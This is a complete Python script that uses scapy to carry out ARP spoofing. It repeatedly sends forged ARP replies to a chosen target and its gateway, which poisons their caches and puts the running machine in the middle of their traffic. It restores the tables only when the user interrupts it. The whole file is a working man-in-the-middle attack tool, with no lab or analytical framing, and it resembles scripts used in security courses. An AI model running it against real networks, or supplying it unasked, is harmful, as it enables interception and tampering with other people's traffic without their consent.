#!/usr/bin env python

import scapy.all as scapy
import time
import optparse


def get_args():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="target", help="Target IP to spoof")
    parser.add_option("-g", "--gateway", dest="gateway", help="Gateway IP")
    (options,args) = parser.parse_args()
    if not options.target:
        parser.error("[-] Please specify target, use --help for more info")
        exit(-1)
    if not options.gateway:
        parser.error("[-] Please specify gateway, use --help for more info")
        exit(-1)
    return options


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_req_broad = broadcast/arp_request
    answered_list = scapy.srp(arp_req_broad,timeout=1,verbose=False)[0]

    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet,verbose=False)


def restore(dest_ip, src_ip):
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=get_mac(dest_ip), psrc=src_ip, hwsrc=get_mac(src_ip))
    scapy.send(packet, count=4, verbose=False)


options = get_args()
tar_ip = options.target
gate_ip = options.gateway
sent_count = 0
try :
    while True:
        spoof(tar_ip,gate_ip)
        spoof(gate_ip,tar_ip)
        print("\r[+] Packets sent: " + str(sent_count+2), end="")
        sent_count+=2
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] Detected CTRL + C ..... Resetting ARP table..... Please wait")
    restore(gate_ip,tar_ip)
    restore(tar_ip,gate_ip)
    print("[+] Tables restored to Default .... Quiting.")
